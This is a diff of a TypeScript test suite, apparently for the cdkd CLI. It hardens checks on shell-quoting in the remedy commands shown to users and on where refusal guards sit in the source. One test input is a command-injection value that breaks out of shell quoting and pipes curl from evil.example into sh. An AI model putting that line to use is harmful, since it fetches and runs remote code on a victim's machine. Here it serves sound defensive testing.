@@ -15,6 +15,20 @@ import type { StackState } from '../../../src/types/state.js';
 
 const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
 
+/**
+ * Source with comments removed. Every source-shape assertion below reads THIS,
+ * because one of them was already satisfied by prose: a
+ * `toContain('!opts.dryRun')` matched a doc comment quoting the gate it meant
+ * to pin, so deleting the runtime gate and keeping the comment left the fence
+ * green. A grep over un-stripped source asserts that someone WROTE a string,
+ * not that the code DOES anything.
+ */
+function code(relPath: string): string {
+  return readFileSync(join(repoRoot, relPath), 'utf8')
+    .replace(/\/\*[\s\S]*?\*\//g, '')
+    .replace(/(^|[^:])\/\/.*$/gm, '$1');
+}
+
 function state(resources: unknown): StackState {
   return {
     version: 10,
@@ -140,24 +154,34 @@ describe('the user-facing text', () => {
     // this name closed the quoting and appended a command to the line the text
     // tells the user to RUN.
     const INJECTION = "a'; curl http://evil.example/x|sh; echo '";
-    const texts = [malformedResourcesWarning(INJECTION, 'us-east-1')];
-    try {
-      refuseMalformedState(state(null), INJECTION, 'us-east-1');
-    } catch (err) {
-      texts.push((err as Error).message);
+    // BOTH arguments, and both orders. The region side is interpolated into
+    // the same command and was unfenced: passing a benign `us-east-1` there
+    // made `shellQuote(reg)` deletable with no test noticing, since shellQuote
+    // returns an ordinary region unquoted anyway.
+    const texts: string[] = [
+      malformedResourcesWarning(INJECTION, 'us-east-1'),
+      malformedResourcesWarning('MyStack', INJECTION),
+    ];
+    for (const [stack, region] of [
+      [INJECTION, 'us-east-1'],
+      ['MyStack', INJECTION],
+    ] as const) {
+      try {
+        refuseMalformedState(state(null), stack, region);
+      } catch (err) {
+        texts.push((err as Error).message);
+      }
     }
-    expect(texts.length).toBe(2);
+    expect(texts.length).toBe(4);
 
     for (const text of texts) {
-      // Non-vacuity: the name must survive into the text at all, or the
-      // assertion below passes over a string that never carried it.
-      expect(text, 'the hostile name never reached the rendered text').toContain('curl');
+      // The PROSE carries both identifiers too and was outside every probe,
+      // so check the whole text, not only the command tail.
+      expect(text, 'the hostile value never reached the rendered text').toContain('curl');
       const command = text.slice(text.indexOf('cdkd state show'));
       expect(command, 'the remedy command is missing').toContain('cdkd state show');
       // Inside a single-quoted shell word, the ONLY way out is a closing quote.
       // shellQuote escapes each one as '\'' so the word never terminates early.
-      const bare = command.match(/cdkd state show (\S+|'(?:[^']|'\\'')*')/);
-      expect(bare, `remedy argument is not a single shell word: ${command}`).not.toBeNull();
       expect(
         command.includes("|sh") && !command.includes("'\\''"),
         `the remedy still carries an unescaped injection: ${command}`
@@ -170,7 +194,11 @@ describe('the user-facing text', () => {
     // into a differently-broken command.
     const text = malformedResourcesWarning('\u0000\u0001', '\u0002');
     expect(text).toContain('<unrenderable>');
-    expect(text, 'an empty argument collapsed the flags').not.toContain('--stack-region --json');
+    // NOT `not.toContain('--stack-region --json')`: neither regression can emit
+    // that exact string -- dropping UNRENDERABLE gives `--stack-region '' --json`
+    // and dropping shellQuote gives TWO spaces -- so it could never fail.
+    // Assert the positive: a NAMED argument follows the flag.
+    expect(text).toMatch(/--stack-region \S+ --json/);
   });
 
   it('carries the generic exit code — scrub needs a different one and says so', () => {
@@ -194,8 +222,15 @@ describe('the user-facing text', () => {
         'documented contract before adopting it — they disagree.'
     ).toBeUndefined();
 
-    // Both spellings say the same thing, so scrub's copy cannot drift.
-    expect(thrown?.message).toContain(malformedStateRefusalMessage('S', 'r'));
+    // scrub raises its own class, so its wording CAN drift from this one.
+    // `expect(thrown.message).toContain(malformedStateRefusalMessage(...))`
+    // would be self-referential -- refuseMalformedState IS that throw -- so
+    // the claim is checked where it can actually be false: scrub's source.
+    expect(
+      code('src/cli/commands/scrub.ts'),
+      'scrub no longer raises its refusal through malformedStateRefusalMessage, so its wording ' +
+        'can drift from every other refusing command.'
+    ).toContain('malformedStateRefusalMessage(');
   });
 
   it('hasReadableResources is exported, because scrub branches on it directly', () => {
@@ -213,11 +248,18 @@ describe('the user-facing text', () => {
     // `[\s\S]*?` span ran past an arm's closing brace and swallowed the next
     // one, which made this fence red for the wrong reason while looking right.
     // `unverifiableReads` appears exactly once per ScrubStackResult literal.
-    const src = readFileSync(join(repoRoot, 'src/cli/commands/scrub.ts'), 'utf8');
+    const src = code('src/cli/commands/scrub.ts');
     const repairAt = src.indexOf('repairMalformedResourcesForReadOnly(state)');
     expect(repairAt, 'scrub no longer repairs under --dry-run').toBeGreaterThan(-1);
-    const endAt = src.indexOf('THE MASKING BOUNDARY', repairAt);
-    expect(endAt, "scrubStack's masking-boundary catch moved; this fence's end anchor is gone").
+    // A CODE anchor, and specifically the CALL in scrubStack's masking-boundary
+    // catch. Two earlier spellings were wrong in opposite directions: the
+    // comment `THE MASKING BOUNDARY` resolves to -1 now that `src` is
+    // comment-stripped (span = rest of file), and `} catch (err) {` matches an
+    // INNER catch 901 characters in (span = empty, zero literals, fence
+    // vacuous). `maskSecretsInError` is called only in that outer catch and
+    // sits after both result literals.
+    const endAt = src.indexOf('maskSecretsInError', repairAt);
+    expect(endAt, "scrubStack's masking boundary moved; this fence's end anchor is gone").
       toBeGreaterThan(repairAt);
 
     const body = src.slice(repairAt, endAt);
@@ -263,7 +305,7 @@ describe('the user-facing text', () => {
     //
     // A source-shape check is what fits here: the defect is the POSITION of a
     // throw relative to a `return`, and `scrubCommand` is behind synthesis.
-    const src = readFileSync(join(repoRoot, 'src/cli/commands/scrub.ts'), 'utf8');
+    const src = code('src/cli/commands/scrub.ts');
     const branchAt = src.indexOf('if (options.dryRun) {');
     expect(branchAt, "scrubCommand's --dry-run branch is gone or renamed").toBeGreaterThan(-1);
     const returnAt = src.indexOf('\n    return;', branchAt);
@@ -315,9 +357,21 @@ describe('write-capable commands refuse; read-only ones repair', () => {
   ];
   const REPAIR = ['src/cli/commands/diff-recursive.ts'];
 
+  /**
+   * The FIRST expression in each file that dereferences the resources bag. The
+   * refusal has to come before it; anything else leaves the raw TypeError in
+   * front of the named one.
+   */
+  const FIRST_DEREF: Record<string, string> = {
+    'src/cli/commands/scrub.ts': 'Object.entries(state.resources',
+    'src/cli/commands/import.ts': 'hasOwnProperty.call(existingState.resources',
+    'src/cli/commands/orphan.ts': 'id in state.resources',
+    'src/cli/commands/rollback.ts': '{ ...baseState.resources }',
+  };
+
   for (const file of REFUSE) {
     it(`${file} REFUSES — it can saveState`, () => {
-      const src = readFileSync(join(repoRoot, file), 'utf8');
+      const src = code(file);
       // TWO spellings count as refusing. Most files call the shared helper;
       // `scrub` branches on the exported predicate and raises its OWN exit-2
       // class, because its exit 1 is spoken for ("--fail found plaintext").
@@ -366,6 +420,29 @@ describe('write-capable commands refuse; read-only ones repair', () => {
       // stops writing state the classification should be revisited, not
       // silently inherited.
       expect(src, `${file} no longer calls saveState`).toContain('saveState(');
+
+      // DOMINANCE, not presence. The round-1 defect WAS a position error -- a
+      // guard below the dereference it meant to protect -- so a fence that
+      // only checks the refusal exists would not have caught it, and moving
+      // any of these calls below its file's first bag dereference reds
+      // nothing without this.
+      const refusalAt = Math.max(
+        src.indexOf('refuseMalformedState('),
+        src.indexOf('hasReadableResources(')
+      );
+      const derefAt = FIRST_DEREF[file]!;
+      const derefIndex = src.indexOf(derefAt);
+      expect(
+        derefIndex,
+        `${file} no longer contains its first bag dereference \`${derefAt}\`; this fence's ` +
+          `anchor is stale and it is no longer checking dominance.`
+      ).toBeGreaterThan(-1);
+      expect(
+        refusalAt,
+        `${file} refuses AFTER its first \`state.resources\` dereference (\`${derefAt}\`), so ` +
+          `the raw TypeError still fires one line above the refusal — the exact shape ` +
+          `go-to-k/cdkd#3018's first cut shipped.`
+      ).toBeLessThan(derefIndex);
     });
   }
 
@@ -373,7 +450,7 @@ describe('write-capable commands refuse; read-only ones repair', () => {
   // the top-level command lives. The repair is only safe while NEITHER writes,
   // so the consumer is fenced alongside the producer rather than reasoned about.
   it('src/cli/commands/diff.ts consumes a repaired record and must not write either', () => {
-    const src = readFileSync(join(repoRoot, 'src/cli/commands/diff.ts'), 'utf8');
+    const src = code('src/cli/commands/diff.ts');
     // A write would arrive through a helper, not necessarily through a literal
     // `saveState(` in this file — so the three helpers that own one are fenced
     // by IMPORT as well.
@@ -396,7 +473,7 @@ describe('write-capable commands refuse; read-only ones repair', () => {
 
   for (const file of REPAIR) {
     it(`${file} REPAIRS — it never writes`, () => {
-      const src = readFileSync(join(repoRoot, file), 'utf8');
+      const src = code(file);
       expect(src).toContain('repairMalformedResourcesForReadOnly(');
       expect(src).toContain('malformedResourcesWarning(');
       expect(
